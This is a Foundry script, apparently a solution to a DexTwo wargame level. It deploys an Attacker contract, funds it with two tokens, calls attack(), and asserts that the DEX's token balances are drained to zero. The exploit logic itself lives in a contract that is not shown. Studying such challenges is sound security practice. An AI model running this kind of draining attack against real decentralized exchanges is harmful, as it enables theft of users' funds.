// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity 0.6.2;

import "forge-std/Script.sol";
import "../src/Attacker.sol";
import "../src/ContractTwo.sol";
import "forge-std/console.sol";

contract AttackScript is Script {
    Attacker attacker;
    DexTwo dex = DexTwo(0x88d6cdfC4388d080099cBF8dA3032F29D7BDE187);

    function setUp() public {
        vm.startBroadcast();

        attacker = new Attacker();
    }

    function run() external {
        //send tokens to attacker
        IERC20(dex.token1()).transfer(address(attacker), 10);
        IERC20(dex.token2()).transfer(address(attacker), 10);

        attacker.attack();


        assert(IERC20(dex.token1()).balanceOf(address(dex)) == 0);
        assert(IERC20(dex.token2()).balanceOf(address(dex)) == 0);

        vm.stopBroadcast();
    }
}
